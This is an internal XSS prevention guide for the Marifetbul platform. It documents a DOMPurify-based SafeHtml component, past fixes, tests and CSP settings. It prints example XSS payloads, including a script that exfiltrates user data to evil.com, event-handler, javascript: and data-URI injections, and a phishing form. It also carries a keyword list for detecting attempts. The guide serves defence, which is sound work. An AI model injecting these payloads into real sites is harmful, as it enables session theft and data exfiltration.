# XSS Prevention Guide - Marifetbul Platform

**Version**: 1.0  
**Last Updated**: October 15, 2025  
**Status**: ✅ Production Ready

---

## 📋 Table of Contents

1. [What is XSS?](#what-is-xss)
2. [XSS Types](#xss-types)
3. [SafeHtml Component](#safehtml-component)
4. [Configuration Modes](#configuration-modes)
5. [Usage Examples](#usage-examples)
6. [Attack Vectors](#attack-vectors)
7. [Real-World Fixes](#real-world-fixes)
8. [Testing](#testing)
9. [Best Practices](#best-practices)
10. [Incident Response](#incident-response)

---

## What is XSS?

**Cross-Site Scripting (XSS)** is a security vulnerability that allows attackers to inject malicious JavaScript code into web pages viewed by other users.

### Why is XSS Dangerous?

Attackers can:

- 🔴 **Steal session cookies** and hijack accounts
- 🔴 **Capture user input** (passwords, credit cards)
- 🔴 **Redirect users** to phishing sites
- 🔴 **Modify page content** (fake forms, messages)
- 🔴 **Perform actions** on behalf of users
- 🔴 **Install keyloggers** to monitor typing

### Example Attack

User submits a blog comment:

```html
Great post!
<script>
  fetch('/api/users/me')
    .then((r) => r.json())
    .then((data) =>
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data),
      })
    );
</script>
```

Without proper sanitization, this script executes in every visitor's browser, stealing their data.

---

## XSS Types

### 1. Stored XSS (Persistent)

Malicious script stored in database and displayed to all users.

**Example**:

- User posts a malicious blog comment
- Comment stored in database
- Every visitor's browser executes the script

**Risk**: 🔴 CRITICAL (affects all users)

### 2. Reflected XSS (Non-Persistent)

Malicious script reflected back in response (e.g., search results).

**Example**:

- User clicks link: `https://site.com/search?q=<script>alert('XSS')</script>`
- Server reflects query in response without sanitization
- Script executes in user's browser

**Risk**: 🟡 MEDIUM (affects individual users via malicious links)

### 3. DOM-Based XSS

Malicious script manipulates DOM via client-side JavaScript.

**Example**:

```javascript
// Vulnerable code
const search = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').innerHTML = search;
```

**Risk**: 🟡 MEDIUM (client-side vulnerability)

---

## SafeHtml Component

The `SafeHtml` component is our defense against XSS attacks. It uses **DOMPurify** to sanitize HTML before rendering.

### Location

```
lib/infrastructure/security/xss-protection.tsx
```

### Implementation

```typescript
import DOMPurify from 'isomorphic-dompurify';

interface SafeHtmlProps {
  html: string;
  config?: 'STRICT' | 'RICH' | 'MINIMAL';
  className?: string;
}

export const SafeHtml: React.FC<SafeHtmlProps> = ({
  html,
  config = 'STRICT',
  className = '',
}) => {
  const sanitized = React.useMemo(() => {
    return DOMPurify.sanitize(html, CONFIGS[config]);
  }, [html, config]);

  return (
    <div
      className={className}
      dangerouslySetInnerHTML={{ __html: sanitized }}
    />
  );
};
```

### How It Works

1. **Input**: User-generated HTML content
2. **Sanitize**: DOMPurify removes dangerous elements
3. **Output**: Safe HTML rendered in browser

```
User Input → DOMPurify → Safe HTML → Render
```

---

## Configuration Modes

### STRICT Mode (Default)

**Use for**: User-generated content (comments, reviews, messages)

**Allowed Tags**:

- Text: `<p>`, `<span>`, `<div>`, `<br>`
- Formatting: `<strong>`, `<em>`, `<u>`
- Links: `<a>`

**Example**:

```tsx
<SafeHtml html={userComment} config="STRICT" />
```

**Blocks**:

- ❌ Scripts (`<script>`)
- ❌ Iframes (`<iframe>`)
- ❌ Objects (`<object>`, `<embed>`)
- ❌ Forms (`<form>`, `<input>`)
- ❌ Event handlers (`onclick`, `onerror`)

### RICH Mode

**Use for**: Trusted content (blog posts, help articles, admin content)

**Allowed Tags**:

- Everything in STRICT
- Headings: `<h1>` - `<h6>`
- Lists: `<ul>`, `<ol>`, `<li>`
- Code: `<pre>`, `<code>`
- Tables: `<table>`, `<tr>`, `<td>`
- Images: `<img>` (with URL validation)

**Example**:

```tsx
<SafeHtml html={blogPost.content} config="RICH" className="prose prose-lg" />
```

**Still Blocks**:

- ❌ Scripts
- ❌ Iframes
- ❌ Forms
- ❌ Event handlers

### MINIMAL Mode

**Use for**: Simple text with basic formatting

**Allowed Tags**:

- `<p>`, `<span>`, `<strong>`, `<em>`, `<br>`

**Example**:

```tsx
<SafeHtml html={user.bio} config="MINIMAL" />
```

---

## Usage Examples

### Blog Post Rendering

```tsx
import { SafeHtml } from '@/lib/infrastructure/security/xss-protection';

export function BlogPost({ post }: BlogPostProps) {
  return (
    <article>
      <h1>{post.title}</h1>

      <SafeHtml
        html={post.content}
        config="RICH"
        className="prose prose-lg max-w-none"
      />

      <div className="comments">
        {post.comments.map((comment) => (
          <div key={comment.id}>
            <p>{comment.author}</p>
            <SafeHtml html={comment.text} config="STRICT" />
          </div>
        ))}
      </div>
    </article>
  );
}
```

### Help Article Rendering

```tsx
export function HelpArticle({ article }: HelpArticleProps) {
  return (
    <div>
      <h2>{article.title}</h2>

      <SafeHtml html={article.content} config="RICH" className="help-content" />
    </div>
  );
}
```

### User Profile Bio

```tsx
export function UserProfile({ user }: UserProfileProps) {
  return (
    <div>
      <h3>{user.name}</h3>

      <SafeHtml html={user.bio} config="MINIMAL" className="user-bio" />
    </div>
  );
}
```

### Message/Chat

```tsx
export function Message({ message }: MessageProps) {
  return (
    <div className="message">
      <SafeHtml
        html={message.content}
        config="STRICT"
        className="message-body"
      />
    </div>
  );
}
```

---

## Attack Vectors

### 1. Script Tag Injection

**Attack**:

```html
<script>
  alert('XSS');
</script>
<script>
  fetch('/steal-data');
</script>
```

**Protection**: SafeHtml removes ALL `<script>` tags.

**Test**:

```tsx
<SafeHtml html="<p>Hello</p><script>alert('XSS')</script>" />
// Renders: <p>Hello</p>
```

### 2. Event Handler Injection

**Attack**:

```html
<img src="x" onerror="alert('XSS')" />
<div onclick="maliciousCode()">Click</div>
<body onload="steal()"></body>
```

**Protection**: SafeHtml removes ALL event handlers.

**Test**:

```tsx
<SafeHtml html="<img onerror='alert(1)'>" />
// Renders: <img> (onerror removed)
```

### 3. JavaScript URL Injection

**Attack**:

```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:malicious()"></iframe>
```

**Protection**: SafeHtml blocks `javascript:` URLs.

**Test**:

```tsx
<SafeHtml html="<a href='javascript:alert(1)'>Link</a>" />
// href attribute removed or blocked
```

### 4. Data URI Injection

**Attack**:

```html
<object data="data:text/html,<script>alert('XSS')</script>">
  <iframe src="data:text/html;base64,PHNjcmlwdD4uLi48L3NjcmlwdD4="></iframe>
</object>
```

**Protection**: SafeHtml blocks dangerous data URIs.

### 5. SVG-Based XSS

**Attack**:

```html
<svg>
  <script>
    alert('XSS');
  </script>
</svg>
<svg onload="alert('XSS')"></svg>
```

**Protection**: SafeHtml removes scripts from SVG.

### 6. Form Injection

**Attack**:

```html
<form action="https://phishing.com">
  <input name="password" />
</form>
```

**Protection**: SafeHtml removes `<form>` tags.

---

## Real-World Fixes

### Sprint 3 XSS Vulnerabilities (October 2025)

We fixed **2 critical XSS vulnerabilities** in Sprint 3:

#### 1. Blog Post Rendering

**File**: `app/blog/[slug]/page.tsx`

**Vulnerability**:

```tsx
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: post.content }} />
```

**Attack Scenario**:

1. Attacker creates blog post with malicious script
2. Script stored in database
3. Every visitor's browser executes the script
4. Attacker steals session cookies, redirects to phishing

**Fix**:

```tsx
// ✅ SECURED
import { SafeHtml } from '@/lib/infrastructure/security/xss-protection';

<SafeHtml html={post.content} config="RICH" className="prose prose-lg" />;
```

**Impact**: CRITICAL - All blog viewers protected

#### 2. Help Article Rendering

**File**: `components/domains/support/help-center/ArticleViewer.tsx`

**Vulnerability**:

```tsx
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: article.content }} />
```

**Attack Scenario**:

1. Attacker modifies help article (if compromised admin account)
2. Help article displays to all users seeking support
3. Trusted context makes users less suspicious
4. Script executes, steals credentials

**Fix**:

```tsx
// ✅ SECURED
<SafeHtml html={article.content} config="RICH" className="prose prose-lg" />
```

**Impact**: CRITICAL - All help center users protected

### Verification

Both fixes verified with:

- ✅ Manual testing (script injection attempts blocked)
- ✅ Automated tests (see `tests/security/xss.test.tsx`)
- ✅ Code review
- ✅ Production deployment

---

## Testing

### Manual Testing

#### Test 1: Script Injection

```tsx
const maliciousHTML = '<p>Test</p><script>alert("XSS")</script>';
<SafeHtml html={maliciousHTML} />;
```

**Expected**: Only `<p>Test</p>` renders, no alert.

#### Test 2: Event Handler

```tsx
const maliciousHTML = '<img src="x" onerror="alert(\'XSS\')">';
<SafeHtml html={maliciousHTML} />;
```

**Expected**: Image renders, no onerror, no alert.

#### Test 3: JavaScript URL

```tsx
const maliciousHTML = '<a href="javascript:alert(\'XSS\')">Click</a>';
<SafeHtml html={maliciousHTML} />;
```

**Expected**: Link renders but href blocked/removed.

### Automated Testing

**File**: `tests/security/xss.test.tsx`

```typescript
describe('XSS Prevention', () => {
  it('should remove script tags', () => {
    const malicious = '<p>Hello</p><script>alert("XSS")</script>';
    const sanitized = DOMPurify.sanitize(malicious);

    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('<p>Hello</p>');
  });

  it('should remove event handlers', () => {
    const malicious = '<img onerror="alert(\'XSS\')">';
    const sanitized = DOMPurify.sanitize(malicious);

    expect(sanitized).not.toContain('onerror');
  });

  // ... 50+ more test cases
});
```

**Run tests**:

```bash
npm test tests/security/xss.test.tsx
```

---

## Best Practices

### DO ✅

1. **ALWAYS use SafeHtml** for user-generated HTML
2. **Choose appropriate config** (STRICT for users, RICH for trusted)
3. **Test all XSS vectors** before deploying
4. **Keep DOMPurify updated** (security patches)
5. **Use Content Security Policy** headers
6. **Escape by default** (React does this automatically)
7. **Validate on backend** (defense in depth)
8. **Log suspicious patterns** (attempted XSS)
9. **Educate users** about safe content
10. **Regular security audits**

### DON'T ❌

1. **Never use dangerouslySetInnerHTML** directly
2. **Don't trust user input** (even "trusted" users)
3. **Don't build HTML strings** from user data
4. **Don't disable XSS protection** for convenience
5. **Don't assume sanitization is 100%** (defense in depth)
6. **Don't skip testing** XSS vectors
7. **Don't ignore security warnings** from linters
8. **Don't use outdated libraries**

---

## React Safety by Default

React has built-in XSS protection:

### ✅ Safe (React Escapes Automatically)

```tsx
// These are SAFE - React escapes by default
<p>{user.comment}</p>
<input value={user.name} />
<div title={user.title}>Content</div>
```

React converts:

- `<` to `&lt;`
- `>` to `&gt;`
- `"` to `&quot;`
- `'` to `&#x27;`
- `&` to `&amp;`

### ⚠️ Unsafe (Requires SafeHtml)

```tsx
// These are UNSAFE without SafeHtml
<div dangerouslySetInnerHTML={{ __html: user.html }} />
```

Only use `dangerouslySetInnerHTML` through `SafeHtml` component.

---

## Content Security Policy (CSP)

Add CSP headers to further prevent XSS:

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval' 'unsafe-inline'", // TODO: Remove unsafe-*
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self' https://api.marifetbul.com",
      "frame-ancestors 'none'",
    ].join('; '),
  },
];
```

**Goal**: Remove `'unsafe-inline'` and `'unsafe-eval'` (requires refactoring).

---

## Monitoring & Logging

### Log Suspicious Patterns

```typescript
// Backend logging
@PostMapping("/posts")
public Post createPost(@RequestBody PostDto dto) {
    if (containsSuspiciousPatterns(dto.content)) {
        securityLogger.warn("Potential XSS attempt detected",
            "user", getCurrentUser().getEmail(),
            "content", dto.content);
    }

    // Continue (DOMPurify will sanitize)
    return postService.create(dto);
}

private boolean containsSuspiciousPatterns(String content) {
    return content.contains("<script")
        || content.contains("javascript:")
        || content.contains("onerror=")
        || content.contains("onload=");
}
```

### Alerts

Set up alerts for:

- Multiple XSS attempts from same user
- Attempts to inject common payloads
- Bypasses of sanitization (should never happen)

---

## Incident Response

### If XSS Vulnerability Discovered

1. **Immediate Actions**:
   - Disable affected feature if critical
   - Deploy hotfix with SafeHtml
   - Notify security team

2. **Investigation**:
   - Review logs for exploitation attempts
   - Identify affected users
   - Assess data breach scope

3. **Communication**:
   - Internal: Security team, management
   - External: Users (if exploited), authorities (if required by law)

4. **Prevention**:
   - Add automated tests
   - Update security guidelines
   - Conduct team training

---

## Checklist

Before deploying any feature that renders user content:

- [ ] All user HTML goes through SafeHtml
- [ ] Appropriate config mode selected (STRICT/RICH/MINIMAL)
- [ ] No direct use of dangerouslySetInnerHTML
- [ ] XSS test cases written
- [ ] Manual testing performed
- [ ] Code review by security-aware developer
- [ ] CSP headers configured
- [ ] Logging for suspicious patterns
- [ ] Documentation updated

---

## Resources

### Internal

- **SafeHtml Component**: `lib/infrastructure/security/xss-protection.tsx`
- **Test Suite**: `tests/security/xss.test.tsx`
- **Sprint 3 Analysis**: `SPRINT_3_ANALYSIS_REPORT.md`

### External

- **OWASP XSS Guide**: https://owasp.org/www-community/attacks/xss/
- **DOMPurify**: https://github.com/cure53/DOMPurify
- **React Security**: https://react.dev/learn/writing-markup-with-jsx#jsx-prevents-injection-attacks
- **Content Security Policy**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

---

## Conclusion

XSS is a critical security threat, but with proper use of the SafeHtml component and defense-in-depth strategies, we can protect our users.

**Remember**:

- ✅ Always sanitize user HTML
- ✅ Use SafeHtml component
- ✅ Test thoroughly
- ✅ Stay updated on security best practices

---

**Document Owner**: Security Team  
**Review Cycle**: Quarterly  
**Last Review**: October 15, 2025  
**Next Review**: January 15, 2026

**Contact**: [security@marifetbul.com](mailto:security@marifetbul.com)
